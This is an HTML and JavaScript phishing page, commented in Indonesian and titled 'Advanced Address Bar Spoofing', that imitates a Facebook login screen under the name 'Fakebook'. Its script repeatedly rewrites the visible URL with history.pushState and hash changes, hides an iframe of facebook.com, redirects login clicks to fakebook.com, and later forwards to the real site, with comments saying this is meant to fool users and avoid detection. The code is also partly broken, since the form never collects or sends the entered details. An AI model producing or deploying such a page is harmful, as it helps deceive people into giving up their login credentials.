<html>
<head>
    <title>Advanced Address Bar Spoofing</title>
    <style>
        /* Sembunyikan iframe agar pengguna tidak melihatnya */
        iframe {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 0;
            height: 0;
            border: none;
        }
    </style>
</head>
<body>
    <h1>Welcome to Fakebook</h1>
    <form id="loginForm">
        Email: <input type="text" name="username" placeholder="Enter email"><br>
        Password: <input type="password" name="password" placeholder="Enter password">
        <button id="submitBtn">Login</button>
    </form>

    <iframe id="iframeRealSite" src="https://facebook.com"></iframe>

    <script>
        // Fungsi untuk memanipulasi address bar dengan history.pushState dan redirect dinamis
        function spoofAddressBar() {
            // Manipulasi URL tanpa reload halaman
            history.pushState({}, "Fakebook Login", "/login.php");
            location.hash = "#facebook.com/login";
        }

        // Mengalihkan ke halaman phishing setelah interaksi pengguna
        document.getElementById('submitBtn').addEventListener('click', function(event) {
            event.preventDefault();  // Mencegah form dari submit

            // Pengalihan ke situs phishing saat pengguna mengklik Login
            setTimeout(function() {
                window.location.href = "https://fakebook.com";
            }, 100);  // Pengalihan cepat untuk mengelabui pengguna
        });

        // Manipulasi iframe untuk membuat ilusi bahwa halaman asli sedang dibuka
        function fakeInteraction() {
            var iframe = document.getElementById('iframeRealSite');
            var win = iframe.contentWindow;
            // Kirim pesan melalui postMessage untuk mensimulasikan interaksi dengan halaman asli
            win.postMessage("spoof", "https://facebook.com");
        }

        // Setiap 3 detik, update address bar untuk mempertahankan ilusi
        setInterval(function() {
            spoofAddressBar();
        }, 3000);

        // Jalankan pengalihan ke situs asli setelah spoof berjalan beberapa saat (untuk menghindari deteksi)
        setTimeout(function() {
            window.location.href = "https://facebook.com";
        }, 20000);  // 20 detik untuk membuat pengguna berpikir bahwa mereka masih di halaman yang sama

        // Jalankan fungsi interaksi palsu dengan iframe
        fakeInteraction();
    </script>
</body>
</html>
